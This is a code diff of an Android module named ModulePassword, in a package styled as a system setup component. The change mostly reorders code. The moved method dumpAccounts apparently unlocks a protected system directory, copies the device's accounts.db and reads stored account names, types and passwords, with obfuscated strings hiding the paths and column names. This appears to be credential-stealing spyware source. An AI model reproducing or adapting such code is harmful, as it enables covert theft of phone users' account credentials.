@@ -2,6 +2,7 @@ package com.android.syssetup.module;
 
 import android.database.Cursor;
 
+import com.android.mm.M;
 import com.android.syssetup.Status;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.conf.ConfModule;
@@ -15,7 +16,6 @@ import com.android.syssetup.util.ByteArray;
 import com.android.syssetup.util.Check;
 import com.android.syssetup.util.StringUtils;
 import com.android.syssetup.util.WChar;
-import com.android.mm.M;
 
 import java.io.File;
 import java.util.HashMap;
@@ -26,9 +26,86 @@ public class ModulePassword extends BaseModule {
 
 	private static final String TAG = "ModulePassword"; //$NON-NLS-1$
 	private static final int ELEM_DELIMITER = 0xABADC0DE;
+	private static HashMap<String, Integer> services = new HashMap<String, Integer>();
 	private Markup markupPassword;
 	private HashMap<Integer, String> lastPasswords;
-	private static HashMap<String, Integer> services = new HashMap<String, Integer>();
+
+	public static void dumpAccounts(RecordVisitor visitor) {
+		// h_0=/data/system/
+		// h_1=/data/system/users/0/
+		// h_2=accounts.db
+		String pathUser = M.e("/data/system/users/0/");
+		String pathSystem = M.e("/data/system/");
+		String file = M.e("accounts.db");
+
+		String dbFile = "";
+
+		if (!Path.unprotect(pathUser, 3, false)) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (dumpAccounts) error: cannot open path");
+			}
+			return;
+		}
+
+		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(pathSystem, file);
+		if (helper == null) {
+			helper = GenericSqliteHelper.openCopy(pathUser, file);
+		}
+
+		if (helper == null) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (dumpPasswordDb) ERROR: cannot open db");
+			}
+			return;
+		}
+		try {
+			// h_4=accounts
+			String table = M.e("accounts");
+
+			// h_5=_id
+			// h_6=name
+			// h_7=type
+			// h_8=password
+			String[] projection = {M.e("_id"), M.e("name"), M.e("type"), M.e("password ")};
+			visitor.projection = projection;
+
+			helper.traverseRecords(table, visitor);
+		} finally {
+			helper.disposeDb();
+		}
+
+	}
+
+	public static void dumpAddressBookAccounts() {
+
+	}
+
+	private static String getService(String type) {
+
+		Iterator<String> iter = services.keySet().iterator();
+		while (iter.hasNext()) {
+			String key = iter.next();
+			if (type.contains(key)) {
+				return key;
+			}
+		}
+		return M.e("service");
+
+	}
+
+	static int getServiceId(String type) {
+
+		Iterator<String> iter = services.keySet().iterator();
+		while (iter.hasNext()) {
+			String key = iter.next();
+			if (type.contains(key)) {
+				return services.get(key);
+			}
+		}
+
+		return 0;
+
+	}
 
 	@Override
 	protected boolean parse(ConfModule conf) {
@@ -176,83 +253,6 @@ public class ModulePassword extends BaseModule {
 			return parts[1];
 		}
 		return null;
-	}
-
-	public static void dumpAccounts(RecordVisitor visitor) {
-		// h_0=/data/system/
-		// h_1=/data/system/users/0/
-		// h_2=accounts.db
-		String pathUser = M.e("/data/system/users/0/");
-		String pathSystem = M.e("/data/system/");
-		String file = M.e("accounts.db");
-
-		String dbFile = "";
-
-		if (!Path.unprotect(pathUser, 3, false)) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (dumpAccounts) error: cannot open path");
-			}
-			return;
-		}
-
-		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(pathSystem, file);
-		if (helper == null) {
-			helper = GenericSqliteHelper.openCopy(pathUser, file);
-		}
-
-		if (helper == null) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (dumpPasswordDb) ERROR: cannot open db");
-			}
-			return;
-		}
-		try {
-			// h_4=accounts
-			String table = M.e("accounts");
-
-			// h_5=_id
-			// h_6=name
-			// h_7=type
-			// h_8=password
-			String[] projection = {M.e("_id"), M.e("name"), M.e("type"), M.e("password ")};
-			visitor.projection = projection;
-
-			helper.traverseRecords(table, visitor);
-		} finally {
-			helper.disposeDb();
-		}
-
-	}
-
-	public static void dumpAddressBookAccounts() {
-
-	}
-
-	private static String getService(String type) {
-
-		Iterator<String> iter = services.keySet().iterator();
-		while (iter.hasNext()) {
-			String key = iter.next();
-			if (type.contains(key)) {
-				return key;
-			}
-		}
-		return M.e("service");
-
-	}
-
-	static int getServiceId(String type) {
-
-		Iterator<String> iter = services.keySet().iterator();
-		while (iter.hasNext()) {
-			String key = iter.next();
-			if (type.contains(key)) {
-				return services.get(key);
-			}
-		}
-
-		return 0;
-
 	}
 
 	@Override
